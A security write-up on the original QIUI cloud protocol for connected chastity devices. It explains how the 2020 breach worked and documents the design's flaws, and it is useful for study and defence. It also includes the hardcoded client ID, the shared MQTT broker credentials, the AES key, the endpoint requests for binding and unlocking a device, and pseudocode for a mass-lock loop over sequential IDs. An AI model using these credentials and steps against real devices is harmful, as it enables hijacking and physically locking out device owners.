# QIUI Cloud Protocol (Original)

How the original QIUI cloud service authenticates users, identifies devices, and sends commands. This is the protocol that was compromised in the widely-reported 2020 breach that left users locked in their devices.

## Overview

```
┌──────────┐         ┌──────────────────┐         ┌──────────┐
│  Mobile   │◄──────►│   QIUI Cloud     │◄──MQTT──►│  Device  │
│   App     │  HTTPS  │  openapi.qiuitoy │          │  (BLE/4G)│
└──────────┘         └──────────────────┘         └──────────┘
     │                                                  ▲
     └──────────────── BLE ────────────────────────────┘
```

All intelligence lives in the cloud. The app is a relay — it asks the cloud for hex command bytes, then writes them to the BLE device. The device itself has no concept of who is sending commands.

## Authentication

### Step 1: Get Platform Token

```
POST /system/api/device/common/getPlatformApiToken

{
  "clientId": "Client_35115347524B4D1CA9A20BF2F660EF49",
  "grantType": "client_credentials"
}

Response:
{
  "code": 200,
  "data": {
    "platformApiToken": "eyJhbGciOiJIUzUxMiJ9...",
    "expiresTime": 43193
  }
}
```

**Problem:** The Client ID is hardcoded in every copy of the app. It's not a secret — it's the same string for every user worldwide. Anyone who decompiles the APK (or reads the open-source sample) has it. The "authentication" is essentially:

```
┌─────────┐                    ┌─────────────┐
│ Attacker │───── Same ────────►│ QIUI Cloud  │
│          │   Client ID as     │             │
│          │   every other app  │  "Welcome!" │
└─────────┘                    └─────────────┘
```

There is **no per-user authentication**. No username, no password, no account. The platform token grants access to device operations for **any** device.

### Step 2: Get Device Token

```
POST /system/api/device/common/getDeviceToken
Authorization: {platformApiToken}

{
  "bluetoothAddress": "17:DA:45:7D:A9:11",
  "serialNumber": "QIUIwwnnk1234567",
  "typeId": 6
}

Response:
{
  "code": 200,
  "data": "6612C16C7D600088AC8ACA4BA5350281"
}
```

The device token is a hex string used in BLE command construction. It's fetched per-device but there's no verification that the requesting user owns the device.

## Device Identification

Devices are identified by:

| Field | Example | Entropy |
|-------|---------|---------|
| MAC Address | `17:DA:45:7D:A9:11` | 48 bits (but BLE MACs are often sequential from manufacturing) |
| Serial Number | `QIUIwwnnk1234567` | Predictable prefix + sequential digits |
| Type ID | `6` | Single digit (6 = KeyPod, 10 = CellMate Pro, 13 = Metal) |
| Cloud Device ID | `26` | **Sequential integer** |

The cloud assigns device IDs as sequential integers. Device #26 was registered after #25. This means:

```
Device IDs:  1, 2, 3, 4, 5, 6, ... 26, 27, 28 ...
                 ▲
                 │
          Simply increment to find the next device
```

**There is no authorization check** — if you know (or guess) a device's MAC address or cloud ID, you can query it, bind it, and send commands to it.

## Pairing (Device Binding)

```
POST /system/api/platform/device/addDeviceInfo
Authorization: {platformApiToken}

{
  "bluetoothAddress": "17:DA:45:7D:A9:11"
}

Response:
{
  "code": 200,
  "data": {
    "id": 26,
    "userId": 107,
    "bluetoothAddress": "17:DA:45:7D:A9:11",
    "serialNumber": "QIUIwwnnk1234567",
    "typeId": 6
  }
}
```

**There is no pairing code.** No out-of-band verification. No consent from the device owner. If you know a MAC address, you can bind the device to yourself. The cloud assigns you a `userId` and links it to the device.

```
Attacker knows MAC ──► addDeviceInfo ──► Cloud says "OK, it's yours now"
                                              │
                                              ▼
                                         No notification
                                         to actual owner
```

## Command Flow

### BLE Path (Local Proximity)

```
┌─────────┐    1. Request cmd hex     ┌──────────┐
│   App    │─────────────────────────►│  Cloud   │
│          │◄─────────────────────────│          │
│          │    2. Hex command bytes   │          │
│          │                          └──────────┘
│          │    3. BLE Write
│          │─────────────────────────►┌──────────┐
│          │◄─────────────────────────│  Device  │
│          │    4. BLE Notify (enc)   └──────────┘
│          │
│          │    5. Decrypt via cloud
│          │─────────────────────────►┌──────────┐
│          │◄─────────────────────────│  Cloud   │
└─────────┘    6. Decrypted result    └──────────┘
```

### 4G Path (Remote)

```
┌─────────┐    1. Send cmd via API    ┌──────────┐    2. MQTT     ┌──────────┐
│   App    │─────────────────────────►│  Cloud   │──────────────►│  Device  │
└─────────┘                          └──────────┘               └──────────┘
```

For 4G-equipped devices, the cloud sends the command over MQTT. The app doesn't need BLE proximity at all — commands go: App → Cloud → MQTT → Device.

### Example: Unlock Command

```
POST /system/api/device/keyPod/getKeyPodUnlockCmd
Authorization: {platformApiToken}

{
  "bluetoothAddress": "17:DA:45:7D:A9:11",
  "serialNumber": "QIUIwwnnk1234567",
  "typeId": 6
}

Response:
{
  "code": 200,
  "data": "AB12CD34EF567890..."
}
```

**No signing. No nonces. No replay protection.** If you capture a command, you can replay it. The hex bytes are the same every time for the same operation.

## MQTT

```
Broker:    tcp://openmq.qiuitoy.com:1883
Username:  mqtt_usr_7253ae60
Password:  mqtt_pwd_65abd826
Topic:     device\Client_35115347524B4D1CA9A20BF2F660EF49
```

**The MQTT credentials are hardcoded and shared by every app instance.** Anyone can connect and subscribe to the device status topic for ALL devices.

MQTT messages contain:
```json
{
  "serialNumber": "QIUIwwnnk1234567",
  "mqttType": "mqtt_h00001",
  "cmdStatus": "0",
  "bluetoothAddress": "17:DA:45:7D:A9:11",
  "onlineStatus": "online",
  "battery": "85"
}
```

By subscribing to the shared topic, an attacker can enumerate every online device, learn their MAC addresses, serial numbers, battery levels, and online status — **in real time**.

## Encryption (Disabled)

The codebase contains AES-128-CBC encryption/decryption functions with:

```
Key: C8BE5C77E0104378ABBEF7DA6FBF7408
IV:  0123456789abcdef
```

However, **both functions are commented out** — they return the input unchanged:

```java
public static String encrypt(String content) throws Exception {
    // Cipher cipher = ...
    // 去掉加密 (encryption removed)
    return content;
}
```

All API traffic is sent as plaintext JSON over HTTPS. The AES layer was designed but never activated.

## The Attack Surface

```
┌─────────────────────────────────────────────────────────────┐
│                    QIUI CLOUD ATTACK SURFACE                │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  1. Hardcoded Client ID      → Anyone can get a token       │
│  2. No per-user auth         → No accounts, no passwords    │
│  3. Sequential device IDs    → Enumerate all devices         │
│  4. No ownership verification→ Bind any device by MAC       │
│  5. Shared MQTT credentials  → Monitor all devices globally │
│  6. No command signing       → Forge commands freely         │
│  7. No replay protection     → Replay captured commands     │
│  8. Encryption disabled      → All traffic is plaintext     │
│  9. No rate limiting         → Automate at scale            │
│ 10. Predictable serials      → Guess device identifiers     │
│                                                             │
│  Attack cost: ~30 lines of Python                           │
│  Affected devices: ALL of them                              │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### Mass Lock Attack (What Actually Happened)

```python
# Pseudocode of the actual attack
token = get_platform_token("Client_35115347524B4D1CA9A20BF2F660EF49")

for device_id in range(1, 100000):    # Sequential IDs
    info = query_device(token, device_id)
    if info:
        lock_command(token, info.mac, info.serial, info.type_id)
        print(f"Locked device {device_id}: {info.mac}")
```

This script could lock every QIUI device in existence. There was nothing to stop it — no authentication, no rate limiting, no ownership checks, no signing.

## Timeline

| Event | What Happened |
|-------|--------------|
| Device manufactured | Sequential serial number assigned |
| User buys device | Scans BLE, cloud assigns sequential device ID |
| User "binds" device | MAC address → cloud, no verification |
| Attacker enumerates | Increment device IDs, collect MACs from MQTT |
| Attacker locks devices | Send lock commands for every device found |
| Users locked in | No way to unlock without BLE proximity + working cloud |
| Cloud goes down | Physical lockout — users resort to screwdrivers and bolt cutters |
